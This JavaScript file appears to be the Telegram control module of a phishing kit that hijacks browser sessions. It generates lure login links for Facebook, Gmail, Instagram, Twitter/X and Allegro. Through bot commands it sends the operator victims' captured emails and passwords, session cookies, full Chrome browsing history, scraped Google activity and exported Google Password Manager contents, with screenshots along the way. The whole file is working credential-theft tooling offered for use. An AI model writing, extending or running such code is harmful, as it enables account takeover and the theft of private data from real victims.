// Telegram bot integration — mirrors the live activity log and sends
// cookies automatically once a login is detected. Entirely optional and
// best-effort: every export here is a silent no-op when TELEGRAM_BOT_TOKEN /
// TELEGRAM_CHAT_ID aren't configured, or when Telegram itself is unreachable.

import { config } from './config.js';

function apiUrl(method) {
  return `https://api.telegram.org/bot${config.telegramBotToken}/${method}`;
}

export function isEnabled() {
  return Boolean(config.telegramBotToken && config.telegramChatId);
}

export async function sendMessage(text, options) {
  if (!isEnabled()) return;
  const body = { chat_id: config.telegramChatId, text, disable_web_page_preview: true };
  if (options && options.parseMode) body.parse_mode = options.parseMode;
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch { /* best-effort */ }
}

export async function sendDocument(buffer, filename, caption) {
  if (!isEnabled()) return;
  try {
    const boundary = '----spBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${config.telegramChatId}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
    text(`Content-Type: application/octet-stream\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendDocument'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch { /* best-effort */ }
}

// sendPhoto — sends a JPEG/PNG buffer as an inline photo (visible directly in chat).
// Use this for screenshots instead of sendDocument.
export async function sendPhoto(buffer, caption, chatId) {
  if (!isEnabled()) return;
  try {
    const targetChat = chatId || config.telegramChatId;
    const boundary = '----spPhotoBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${targetChat}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption.slice(0, 1024)}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="photo"; filename="screen.jpg"\r\n`);
    text(`Content-Type: image/jpeg\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendPhoto'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch { /* best-effort */ }
}

export async function discoverChatId() {
  const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
  const data = await res.json();
  const upd = data.result?.[data.result.length - 1];
  return upd?.message?.chat?.id ?? upd?.channel_post?.chat?.id ?? null;
}

// ── Helper ────────────────────────────────────────────────────────────────────

async function replyTo(chatId, text) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true }),
    });
  } catch { /* best-effort */ }
}

// ── /adduser <login> <password> — create panel user ──────────────────────────

async function handlePanelAdduser(chatId, args) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Usage: /adduser <username> <password>\nPassword min. 8 characters.');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  const password = String(args[1]);
  if (!/^[a-z0-9_-]{1,64}$/.test(username)) {
    await replyTo(chatId, '❌ Username: only a-z, digits, _ or -. Max 64 chars.');
    return;
  }
  if (password.length < 8) {
    await replyTo(chatId, '❌ Password too short (min. 8 characters).');
    return;
  }
  try {
    const { createUser } = await import('./userdb.js');
    await createUser(username, password);
    await replyTo(chatId, `✅ User "${username}" created.`);
  } catch (err) {
    if (err?.message === 'username_taken') {
      await replyTo(chatId, `❌ Username "${username}" already exists.`);
    } else {
      await replyTo(chatId, `❌ Error: ${err?.message || err}`);
    }
  }
}

// ── /users — list panel users ─────────────────────────────────────────────────

async function handleUsers(chatId) {
  try {
    const { listUsers } = await import('./userdb.js');
    const users = await listUsers();
    if (users.length === 0) {
      await replyTo(chatId, 'No panel users found.');
      return;
    }
    const lines = users.map(u => {
      const date = new Date(u.createdAt).toISOString().slice(0, 10);
      const icon = u.active ? '🟢' : '🔴';
      return `${icon} ${u.username}  (${date})`;
    });
    await replyTo(chatId, `👥 Panel users (${users.length}):\n${lines.join('\n')}`);
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

// ── /deluser <login> — delete panel user ─────────────────────────────────────

async function handleDeluser(chatId, args) {
  if (args.length < 1) {
    await replyTo(chatId, '❌ Usage: /deluser <username>');
    return;
  }
  const username = String(args[0]).trim().toLowerCase();
  try {
    const { deleteUser } = await import('./userdb.js');
    const { deleteSessionsByUsername } = await import('./session.js');
    const removed = await deleteUser(username);
    if (!removed) {
      await replyTo(chatId, `❌ User "${username}" not found.`);
      return;
    }
    deleteSessionsByUsername(username);
    await replyTo(chatId, `✅ User "${username}" deleted and sessions revoked.`);
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

// ── /getpass [id] — show stored credentials ───────────────────────────────────

async function handleGetPass(chatId, args) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (args.length > 0) {
      const id = args[0].toLowerCase();
      const acc = list.find(a => a.id === id);
      if (!acc) { await replyTo(chatId, `❌ Account not found: "${id}"`); return; }
      const lines = [`📋 Account: ${acc.label} (${acc.id})`];
      if (acc.email)    lines.push(`📧 Email: ${acc.email}`);
      if (acc.password) lines.push(`🔑 Password: ${acc.password}`);
      if (!acc.email && !acc.password) lines.push('(no credentials saved)');
      await replyTo(chatId, lines.join('\n'));
    } else {
      const withCreds = list.filter(a => a.email || a.password);
      if (withCreds.length === 0) { await replyTo(chatId, 'No saved credentials.'); return; }
      const lines = [`🔐 Saved credentials (${withCreds.length}):`];
      for (const acc of withCreds) {
        lines.push(`\n📋 ${acc.label} (${acc.id})`);
        if (acc.email)    lines.push(`  📧 ${acc.email}`);
        if (acc.password) lines.push(`  🔑 ${acc.password}`);
      }
      await replyTo(chatId, lines.join('\n'));
    }
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

// ── /cookies <id> — export cookies as JSON file ───────────────────────────────

async function handleCookies(chatId, args) {
  if (args.length < 1) {
    await replyTo(chatId, '❌ Usage: /cookies <id>');
    return;
  }
  const id = args[0].toLowerCase();
  try {
    const { getAccount } = await import('./accounts.js');
    const acc = await getAccount(id);
    if (!acc) { await replyTo(chatId, `❌ Account not found: "${id}"`); return; }
    const { getContext } = await import('./browser.js');
    const ctx = getContext(id);
    if (!ctx) { await replyTo(chatId, `❌ Session "${id}" is not running.`); return; }
    const cookies = await ctx.cookies();
    const json = JSON.stringify(cookies, null, 2);
    const buf = Buffer.from(json, 'utf8');
    await sendDocument(buf, `cookies-${id}.json`, `🍪 Cookies: ${acc.label}`);
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

// ── /accounts — list all accounts ────────────────────────────────────────────

async function handleAccounts(chatId) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    if (list.length === 0) { await replyTo(chatId, 'No accounts. Use /addaccount <name> <platform>'); return; }
    const lines = [`📱 Accounts (${list.length}):`];
    for (const acc of list) {
      const hasCreds = acc.email || acc.password ? ' 🔑' : '';
      lines.push(`• ${acc.id} — ${acc.label}${hasCreds}`);
    }
    lines.push('\nUse /getpass <id> or /cookies <id>');
    await replyTo(chatId, lines.join('\n'));
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

// ── /addaccount <name> <platform> — create account ───────────────────────────

const PLATFORM_URLS = {
  facebook: 'https://www.facebook.com/', fb: 'https://www.facebook.com/',
  gmail: 'https://mail.google.com/mail/u/0/', gm: 'https://mail.google.com/mail/u/0/',
  google: 'https://mail.google.com/mail/u/0/',
  instagram: 'https://www.instagram.com/', ig: 'https://www.instagram.com/',
  twitter: 'https://x.com/', tw: 'https://x.com/', x: 'https://x.com/',
  allegro: 'https://allegro.pl/', al: 'https://allegro.pl/',
};
const PLATFORM_LABELS = {
  facebook: 'Facebook', fb: 'Facebook',
  gmail: 'Gmail', gm: 'Gmail', google: 'Gmail',
  instagram: 'Instagram', ig: 'Instagram',
  twitter: 'Twitter / X', tw: 'Twitter / X', x: 'Twitter / X',
  allegro: 'Allegro', al: 'Allegro',
};
const PLATFORM_CANONICAL = {
  facebook: 'facebook', fb: 'facebook',
  gmail: 'gmail', gm: 'gmail', google: 'gmail',
  instagram: 'instagram', ig: 'instagram',
  twitter: 'twitter', tw: 'twitter', x: 'twitter',
  allegro: 'allegro', al: 'allegro',
};

const PLATFORM_ICONS = {
  facebook: '👤', gmail: '📧', google: '📧',
  instagram: '📸', twitter: '🐦', allegro: '🛒',
};

async function handleAddAccount(chatId, args, publicHost) {
  if (args.length < 2) {
    await replyTo(chatId, '❌ Usage: /addaccount <name> <platform>\nPlatforms: facebook (fb), gmail (gm), instagram (ig), twitter (tw), allegro (al)');
    return;
  }
  const name = args[0];
  const platform = args[1].toLowerCase();
  const startUrl = PLATFORM_URLS[platform];
  if (!startUrl) {
    await replyTo(chatId, `❌ Unknown platform: "${platform}"\nAvailable: facebook (fb), gmail (gm), instagram (ig), twitter (tw), allegro (al)`);
    return;
  }
  const canonical = PLATFORM_CANONICAL[platform];
  const platLabel = PLATFORM_LABELS[platform];
  const label = `${name} – ${platLabel}`;
  const id = `${name}-${canonical}`.trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9_-]/g, '');
  if (!id) { await replyTo(chatId, '❌ Name contains invalid characters.'); return; }
  try {
    const { saveAccount, getAccount } = await import('./accounts.js');
    const { start, stop, wipeProfile } = await import('./browser.js');
    const existed = Boolean(await getAccount(id));
    if (!existed) { await stop(id).catch(() => {}); await wipeProfile(id); }
    const { config } = await import('./config.js');
    const proxyFields = (canonical === 'facebook' || canonical === 'gmail') && config.proxyServer
      ? { proxyServer: config.proxyServer, proxyUsername: config.proxyUsername, proxyPassword: config.proxyPassword }
      : {};
    await saveAccount({ id, label, startUrl, ...proxyFields });
    await start(id, '127.0.0.1').catch(() => {});
    const saved = await getAccount(id);
    const ref = saved?.ref || '';
    const host = publicHost || config.publicHost;
    const link = ref && host ? `https://${host}/account/login?ref=${ref}` : '(no PUBLIC_HOST set)';
    await replyTo(chatId, `✅ Account "${label}" created!\n🔗 Link: ${link}`);
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

// ── /panel — inline keyboard main menu ───────────────────────────────────────

async function editMessage(chatId, messageId, text) {
  try {
    await fetch(apiUrl('editMessageText'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, disable_web_page_preview: true }),
    });
  } catch { /* best-effort */ }
}

async function sendInlineMessage(chatId, text, inline_keyboard) {
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard },
        disable_web_page_preview: true,
      }),
    });
  } catch { /* best-effort */ }
}

async function answerCallback(callbackQueryId, text) {
  try {
    await fetch(apiUrl('answerCallbackQuery'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text || '' }),
    });
  } catch { /* best-effort */ }
}

async function handlePanel(chatId, publicHost) {
  try {
    const { loadAccounts } = await import('./accounts.js');
    const { status: sessionStatus } = await import('./browser.js');
    const list = await loadAccounts();
    if (list.length === 0) {
      await replyTo(chatId, '📱 No accounts yet.\nUse /addaccount <name> <platform>');
      return;
    }
    const keyboard = list.map(acc => {
      const running = sessionStatus(acc.id) === 'running';
      const dot = running ? '🟢' : '⚫';
      // detect platform from label suffix or id
      const platKey = Object.keys(PLATFORM_CANONICAL).find(k =>
        acc.id.endsWith(`-${PLATFORM_CANONICAL[k]}`) || acc.label.toLowerCase().includes(k)
      );
      const platIcon = platKey ? (PLATFORM_ICONS[PLATFORM_CANONICAL[platKey]] || '') : '';
      const allegroPrefix = acc.id.startsWith('allegro-') ? 'allegro-' : '';
      const displayLabel = allegroPrefix
        ? `${dot} ${platIcon} allegro-${acc.label}`.trim()
        : `${dot} ${platIcon} ${acc.label}`.trim();
      return [{ text: displayLabel, callback_data: `acc:${acc.id}` }];
    });
    keyboard.push([
      { text: '➕ New Account', callback_data: 'help:addaccount' },
      { text: '📋 All History', callback_data: 'hist:all' },
    ]);
    const running = list.filter(a => sessionStatus(a.id) === 'running').length;
    await sendInlineMessage(chatId,
      `🎛 *Control Panel* — ${list.length} account${list.length !== 1 ? 's' : ''} (${running} running)`,
      keyboard
    );
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

async function handleAccountMenu(chatId, accountId, callbackQueryId, publicHost) {
  try {
    const { getAccount } = await import('./accounts.js');
    const { status: sessionStatus } = await import('./browser.js');
    const acc = await getAccount(accountId);
    if (!acc) { await answerCallback(callbackQueryId, '❌ Account not found'); return; }
    await answerCallback(callbackQueryId);

    const host = publicHost || config.publicHost;
    const link = acc.ref && host ? `https://${host}/account/login?ref=${acc.ref}` : null;
    const running = sessionStatus(accountId) === 'running';

    const lines = [
      `📋 *${acc.label}*`,
      `Status: ${running ? '🟢 Running' : '⚫ Stopped'}`,
    ];
    if (acc.email)    lines.push(`📧 ${acc.email}`);
    if (acc.password) lines.push(`🔑 ${acc.password}`);

    const keyboard = [
      [
        { text: '🔑 Credentials', callback_data: `pass:${accountId}` },
        { text: '🍪 Cookies', callback_data: `cook:${accountId}` },
      ],
      [
        { text: '🌐 Browser History', callback_data: `hist:${accountId}` },
        { text: '🔍 Google Activity', callback_data: `gact:${accountId}` },
      ],
      [
        { text: '🔐 Google Passwords', callback_data: `gpas:${accountId}` },
        { text: '🗑 Delete Profile', callback_data: `del:${accountId}` },
      ],
    ];
    if (link) keyboard.push([{ text: '🔗 Open Session', url: link }]);
    keyboard.push([{ text: '« Back', callback_data: 'panel' }]);

    await sendInlineMessage(chatId, lines.join('\n'), keyboard);
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

async function handleDeleteProfile(chatId, accountId, callbackQueryId) {
  try {
    const { getAccount } = await import('./accounts.js');
    const acc = await getAccount(accountId);
    if (!acc) { await answerCallback(callbackQueryId, '❌ Account not found'); return; }
    await answerCallback(callbackQueryId);
    await sendInlineMessage(chatId,
      `⚠️ *Delete profile "${acc.label}"?*\n\nThis will permanently stop the session and wipe all browser data (cookies, history, passwords cache). This cannot be undone.`,
      [
        [
          { text: '✅ Yes, Delete', callback_data: `del_confirm:${accountId}` },
          { text: '❌ Cancel', callback_data: `acc:${accountId}` },
        ],
      ]
    );
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

async function handleDeleteConfirm(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Deleting...');
  try {
    const { getAccount, deleteAccount } = await import('./accounts.js');
    const { stop, wipeProfile } = await import('./browser.js');
    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Account not found'); return; }
    await stop(accountId).catch(() => {});
    await wipeProfile(accountId);
    await deleteAccount(accountId);
    await replyTo(chatId, `✅ Profile *${acc.label}* deleted — session stopped and all browser data wiped.`);
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

async function handlePassFile(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Generating file...');
  try {
    const { loadAccounts } = await import('./accounts.js');
    const list = await loadAccounts();
    const withCreds = accountId === 'all'
      ? list.filter(a => a.email || a.password)
      : list.filter(a => a.id === accountId && (a.email || a.password));
    if (withCreds.length === 0) {
      await replyTo(chatId, '(no saved credentials)');
      return;
    }
    const lines = [];
    for (const acc of withCreds) {
      lines.push(`=== ${acc.label} (${acc.id}) ===`);
      if (acc.email)    lines.push(`Email:    ${acc.email}`);
      if (acc.password) lines.push(`Password: ${acc.password}`);
      lines.push('');
    }
    const buf = Buffer.from(lines.join('\n'), 'utf8');
    const fname = accountId === 'all' ? 'credentials-all.txt' : `credentials-${accountId}.txt`;
    await sendDocument(buf, fname, `🔑 Credentials${accountId === 'all' ? ' — all accounts' : ': ' + withCreds[0]?.label}`);
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

// Returns path to Chrome History SQLite file for a given profile dir, or null.
async function findHistoryPath(profileRoot) {
  const { access, readdir } = await import('node:fs/promises');
  const path = await import('node:path');
  const primary = path.join(profileRoot, 'Default', 'History');
  try { await access(primary); return primary; } catch { /* fall through */ }
  const dirs = await readdir(profileRoot, { withFileTypes: true }).catch(() => []);
  for (const d of dirs) {
    if (!d.isDirectory()) continue;
    const candidate = path.join(profileRoot, d.name, 'History');
    try { await access(candidate); return candidate; } catch { /* skip */ }
  }
  return null;
}


async function handleHistoryFile(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Reading browser history...');
  try {
    const { loadAccounts, getAccount } = await import('./accounts.js');
    const { copyFile, unlink } = await import('node:fs/promises');
    const { DatabaseSync } = await import('node:sqlite');
    const { gzip } = await import('node:zlib');
    const { promisify } = await import('node:util');
    const path = await import('node:path');
    const gzipAsync = promisify(gzip);

    const isAll = accountId === 'all';
    const accounts = isAll
      ? await loadAccounts()
      : [await getAccount(accountId)].filter(Boolean);

    if (!accounts.length) { await replyTo(chatId, '❌ No accounts found'); return; }

    const allRows = [];
    const tmpFiles = [];
    for (const acc of accounts) {
      const profileRoot = path.join(config.dataDir, 'profiles', acc.id);
      const histPath = await findHistoryPath(profileRoot);
      if (!histPath) continue;
      const tmpPath = path.join(config.dataDir, `hist-tmp-${acc.id}-${Date.now()}.db`);
      tmpFiles.push(tmpPath);
      await copyFile(histPath, tmpPath);
      try {
        const db = new DatabaseSync(tmpPath, { open: true });
        const rows = db.prepare(
          `SELECT CAST((v.visit_time / 1000 - 11644473600000) AS INTEGER) AS ts_ms,
                  u.url, u.title
           FROM visits v JOIN urls u ON v.url = u.id`
        ).all();
        db.close();
        for (const r of rows) allRows.push({ ...r, account: acc.label });
      } catch { /* skip broken db */ }
    }

    for (const t of tmpFiles) await unlink(t).catch(() => {});

    if (!allRows.length) {
      await replyTo(chatId, '❌ Browser history is empty in all profiles.');
      return;
    }

    allRows.sort((a, b) => b.ts_ms - a.ts_ms);
    const rows = allRows.slice(0, 500000);

    const escape = v => `"${String(v ?? '').replace(/"/g, '""')}"`;
    const lines = ['date,account,url,title'];
    for (const r of rows) {
      const date = r.ts_ms > 0 ? new Date(r.ts_ms).toISOString().replace('T', ' ').slice(0, 19) : '';
      lines.push([escape(date), escape(r.account), escape(r.url), escape(r.title)].join(','));
    }
    const csvBuf = Buffer.from(lines.join('\n'), 'utf8');
    const compressed = await gzipAsync(csvBuf);
    const fname = isAll ? 'browser-history-all.csv.gz' : `browser-history-${accountId}.csv.gz`;
    const label = isAll ? 'all accounts' : accounts[0].label;
    await sendDocument(compressed, fname, `🌐 Browser History: ${label} (${rows.length} visits)`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

async function handleGoogleActivity(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Opening Google activity...');
  try {
    const { getAccount, loadAccounts: _la } = await import('./accounts.js');
    const { start } = await import('./browser.js');
    const { gzip } = await import('node:zlib');
    const { promisify } = await import('node:util');
    const gzipAsync = promisify(gzip);

    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Account not found'); return; }

    const { getPage } = await import('./browser.js');
    if (!getPage(accountId)) {
      await replyTo(chatId, `⏳ Starting session "${acc.label}"...`);
      await start(accountId, '127.0.0.1');
      await new Promise(r => setTimeout(r, 3000));
    }

    await replyTo(chatId, `🔍 Scraping Google activity for *${acc.label}* — please wait...`);

    const { exportGoogleActivity } = await import('./browser.js');
    const entries = await exportGoogleActivity(accountId, null);

    const escape = v => `"${String(v ?? '').replace(/"/g, '""')}"`;
    const lines = ['date,activity'];
    for (const e of entries) {
      lines.push([escape(e.date), escape(e.text)].join(','));
    }
    const csvBuf = Buffer.from(lines.join('\n'), 'utf8');
    const compressed = await gzipAsync(csvBuf);
    await sendDocument(compressed, `google-activity-${accountId}.csv.gz`,
      `🔍 Google Activity: ${acc.label} (${entries.length} entries)`);
  } catch (err) {
    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
  }
}

// Show two-option menu for Google Passwords export
async function handleGooglePasswords(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId);
  const keyboard = [
    [{ text: '📥 Export CSV (auto)', callback_data: `gpw_csv:${accountId}` }],
    [{ text: '📋 List passwords (slow)', callback_data: `gpw_rows:${accountId}` }],
  ];
  await sendInlineMessage(chatId,
    '🔐 *Choose password export method:*\n\n' +
    '📥 *Export CSV* — opens passwords.google.com/options, authenticates and clicks Export. Bot sends the CSV file.\n\n' +
    '📋 *List passwords* — bot clicks each entry one by one (slow, requires active session).',
    keyboard
  );
}

// Option 1: User-driven CSV export — user auth + click, bot sends CSV file
async function handleGpwCsv(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Opening password manager...');
  try {
    const { getAccount } = await import('./accounts.js');
    const { readFile } = await import('node:fs/promises');
    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Account not found'); return; }

    const { getContext, start, openPasswordsExport } = await import('./browser.js');
    let ctx = getContext(accountId);
    if (!ctx) {
      await replyTo(chatId, `⏳ Starting session *${acc.label}*...`);
      await start(accountId, '127.0.0.1');
      await new Promise(r => setTimeout(r, 3000));
      ctx = getContext(accountId);
      if (!ctx) { await replyTo(chatId, `❌ Failed to start session *${acc.label}*.`); return; }
    }

    await replyTo(chatId,
      `📥 Opening passwords.google.com/options in *${acc.label}*.\n\n` +
      `Sign in if required, then click *Export passwords*.\n\n` +
      `Screenshots every 10s so you can follow along.`
    );

    const onScreenshot = (buf, url) => {
      sendPhoto(buf, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
    };

    const result = await openPasswordsExport(accountId, onScreenshot);

    const buf = await readFile(result.path);
    await sendDocument(buf, result.filename, `🔐 Google Passwords: ${acc.label}`);
    await replyTo(chatId, `✅ Done — CSV file sent above.`);
  } catch (err) {
    await replyTo(chatId, `❌ CSV export error: ${err?.message || err}`);
  }
}

// Option 2: Row-by-row click through password list
async function handleGpwRows(chatId, accountId, callbackQueryId) {
  await answerCallback(callbackQueryId, '⏳ Starting password extraction...');
  try {
    const { getAccount } = await import('./accounts.js');
    const { readFile } = await import('node:fs/promises');
    const acc = await getAccount(accountId);
    if (!acc) { await replyTo(chatId, '❌ Account not found'); return; }

    const { getContext, start, openPasswordsExportRowByRow } = await import('./browser.js');
    let ctx = getContext(accountId);
    if (!ctx) {
      await replyTo(chatId, `⏳ Starting session *${acc.label}*...`);
      await start(accountId, '127.0.0.1');
      await new Promise(r => setTimeout(r, 3000));
      ctx = getContext(accountId);
      if (!ctx) { await replyTo(chatId, `❌ Failed to start session *${acc.label}*.`); return; }
    }

    let progressMsgId = null;
    try {
      const r = await fetch(apiUrl('sendMessage'), {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: `🔐 Opening passwords.google.com — screenshots every 10s...` }),
      });
      const d = await r.json();
      progressMsgId = d.result?.message_id;
    } catch {}

    const onScreenshot = (buf, url) => {
      sendPhoto(buf, `📷 ${acc.label} — ${url.slice(0, 80)}`).catch(() => {});
    };
    const onProgress = (done, total) => {
      if (progressMsgId && done % 5 === 0) {
        editMessage(chatId, progressMsgId, `🔐 Extracting passwords: ${done} / ${total}`).catch(() => {});
      }
    };

    const result = await openPasswordsExportRowByRow(accountId, onScreenshot, onProgress);

    if (progressMsgId) {
      await editMessage(chatId, progressMsgId, `✅ Done: ${result.count} entries — sending file...`);
    }

    const buf = await readFile(result.path);
    try {
      const boundary = '----spBoundary' + Date.now().toString(16);
      const parts = [];
      const t = (s) => parts.push(Buffer.from(s, 'utf8'));
      t(`--${boundary}\r\n`);
      t(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`);
      t(`--${boundary}\r\n`);
      t(`Content-Disposition: form-data; name="caption"\r\n\r\n🔐 Google Passwords: ${acc.label} (${result.count} entries)\r\n`);
      t(`--${boundary}\r\n`);
      t(`Content-Disposition: form-data; name="document"; filename="${result.filename}"\r\n`);
      t(`Content-Type: text/plain\r\n\r\n`);
      parts.push(buf);
      t(`\r\n--${boundary}--\r\n`);
      const tgRes = await fetch(apiUrl('sendDocument'), {
        method: 'POST',
        headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
        body: Buffer.concat(parts),
      });
      const tgData = await tgRes.json().catch(() => ({}));
      if (!tgData.ok) {
        await replyTo(chatId, `⚠️ Telegram rejected file: ${JSON.stringify(tgData.description || tgData)}`);
      }
    } catch (sendErr) {
      await replyTo(chatId, `⚠️ File send error: ${sendErr?.message}`);
    }
    await replyTo(chatId, `✅ Done — ${result.count} passwords.`);
  } catch (err) {
    await replyTo(chatId, `❌ Error: ${err?.message || err}`);
  }
}

// ── Long-poll command listener ────────────────────────────────────────────────

export function startCommandListener(publicHost) {
  if (!config.telegramBotToken) return;
  const adminId = config.telegramAdminId ? String(config.telegramAdminId) : '';

  let offset = 0;
  let running = true;

  // Flush any stale updates accumulated while bot was offline — avoids
  // replaying old callback_queries on every restart.
  async function flushPendingUpdates() {
    try {
      const res = await fetch(apiUrl('getUpdates') + '?limit=100&timeout=0&allowed_updates=["message","callback_query"]');
      const data = await res.json();
      if (data.result?.length) {
        offset = data.result[data.result.length - 1].update_id + 1;
      }
    } catch { /* ignore */ }
  }

  async function poll() {
    await flushPendingUpdates();
    while (running) {
      try {
        const url = apiUrl('getUpdates') + `?timeout=30&offset=${offset}&allowed_updates=["message","callback_query","channel_post"]`;
        const res = await fetch(url, { signal: AbortSignal.timeout(40_000) });
        if (!res.ok) { await new Promise(r => setTimeout(r, 5000)); continue; }
        const data = await res.json();
        for (const upd of data.result || []) {
          offset = upd.update_id + 1;

          // ── callback_query (inline keyboard button) ──
          if (upd.callback_query) {
            const cq = upd.callback_query;
            const fromId = String(cq.from?.id || '');
            if (adminId && fromId !== adminId) { await answerCallback(cq.id, '⛔ Brak dostępu'); continue; }
            const chatId = cq.message?.chat?.id;
            const d = cq.data || '';

            if (d === 'panel') {
              await handlePanel(chatId, publicHost);
              await answerCallback(cq.id);
            } else if (d.startsWith('acc:')) {
              await handleAccountMenu(chatId, d.slice(4), cq.id, publicHost);
            } else if (d.startsWith('pass:')) {
              await handlePassFile(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('cook:')) {
              await answerCallback(cq.id, '⏳ Pobieram cookies...');
              await handleCookies(chatId, [d.slice(5)]);
            } else if (d.startsWith('hist:')) {
              await handleHistoryFile(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('gact:')) {
              await handleGoogleActivity(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('gpas:')) {
              await handleGooglePasswords(chatId, d.slice(5), cq.id);
            } else if (d.startsWith('gpw_csv:')) {
              await handleGpwCsv(chatId, d.slice(8), cq.id);
            } else if (d.startsWith('gpw_rows:')) {
              await handleGpwRows(chatId, d.slice(9), cq.id);
            } else if (d.startsWith('del_confirm:')) {
              await handleDeleteConfirm(chatId, d.slice(12), cq.id);
            } else if (d.startsWith('del:')) {
              await handleDeleteProfile(chatId, d.slice(4), cq.id);
            } else if (d === 'help:addaccount') {
              await answerCallback(cq.id);
              await replyTo(chatId, '➕ Usage: /addaccount <name> <platform>\nPlatforms: facebook (fb), gmail (gm), instagram (ig), twitter (tw), allegro (al)');
            } else {
              await answerCallback(cq.id);
            }
            continue;
          }

          // ── message / command (also channel_post for broadcast channels) ──
          const msg = upd.message || upd.channel_post;
          if (!msg?.text) continue;
          const fromId = String(msg.from?.id || msg.sender_chat?.id || '');
          const chatId = msg.chat?.id;
          // For channel posts from the configured channel, skip the admin-ID check
          // (channel posts don't carry from.id — they're the channel itself posting).
          const isOwnChannel = String(chatId) === String(config.telegramChatId);
          if (adminId && fromId !== adminId && !isOwnChannel) continue;
          const text = msg.text.trim();
          const cmdMatch = text.match(/^(\/\w+)(?:@\S+)?\s*(.*)/s);
          if (!cmdMatch) continue;
          const cmd = cmdMatch[1].toLowerCase();
          const rest = cmdMatch[2].trim();
          const parts = rest ? rest.split(/\s+/) : [];

          if (cmd === '/panel' || cmd === '/start') {
            await handlePanel(chatId, publicHost);
          } else if (cmd === '/adduser') {
            await handlePanelAdduser(chatId, parts);
          } else if (cmd === '/users') {
            await handleUsers(chatId);
          } else if (cmd === '/deluser') {
            await handleDeluser(chatId, parts);
          } else if (cmd === '/addaccount') {
            await handleAddAccount(chatId, parts, publicHost);
          } else if (cmd === '/getpass') {
            await handleGetPass(chatId, parts);
          } else if (cmd === '/cookies') {
            await handleCookies(chatId, parts);
          } else if (cmd === '/accounts') {
            await handleAccounts(chatId);
          }
        }
      } catch {
        await new Promise(r => setTimeout(r, 5000));
      }
    }
  }

  poll().catch(() => {});
  return () => { running = false; };
}
